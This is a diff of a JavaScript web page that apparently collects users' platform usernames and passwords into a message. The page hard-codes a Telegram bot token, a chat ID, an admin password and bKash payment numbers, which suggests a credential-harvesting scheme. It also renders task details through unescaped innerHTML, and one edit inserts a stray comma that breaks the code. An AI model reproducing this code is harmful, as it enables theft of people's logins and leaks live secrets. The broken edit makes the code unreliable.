@@ -1509,7 +1509,7 @@
         const BOT_TOKEN = '8588226486:AAGMJz-_cZva4fU2UCSuwAhBVewlgFqKgJg';
         const CHAT_ID = '7714324222';
         const ADMIN_PHONE = '01841161787';
-        const ADMIN_PASS = '01841161787'; // আপনার সিক্রেট পাসওয়ার্ড
+        const ADMIN_PASS = '01841161787';
 
         const ADMIN_NUMBERS = {
             'Bkash': '01619861105',
@@ -1783,13 +1783,12 @@
                 message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}`;
             }
 
-            // লোকাল স্টোরেজে কাজের হিস্ট্রি সেভ করা (Status: Loading)
             let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
             let newTask = {
                 platform: platform,
                 details: detailsText,
                 date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
-                status: 'Loading' // প্রসেসিং বা লোডিং স্ট্যাটাস
+                status: 'Loading'
             };
             tasks.push(newTask);
             localStorage.setItem('userTasks', JSON.stringify(tasks));
@@ -1866,14 +1865,14 @@
                 return;
             }
 
-            tbody.innerHTML = '';
+,           tbody.innerHTML = '';
             tasks.forEach((t, index) => {
                 tbody.innerHTML += `
                     <tr>
                         <td><b>${t.platform}</b><br><small>${t.details}</small></td>
                         <td>${t.date}</td>
                         <td>
-                            <button onclick="changeTaskStatus(${index}, 'Success')" style="background:#34d399; border:none; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer; color:#000;">ס Correct</button>
+                            <button onclick="changeTaskStatus(${index}, 'Success')" style="background:#34d399; border:none; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer; color:#000;">✓ Correct</button>
                             <button onclick="changeTaskStatus(${index}, 'Failed')" style="background:#ef4444; border:none; padding:4px 8px; border-radius:4px; font-weight:bold; cursor:pointer; color:#fff;">X Wrong</button>
                         </td>
                     </tr>
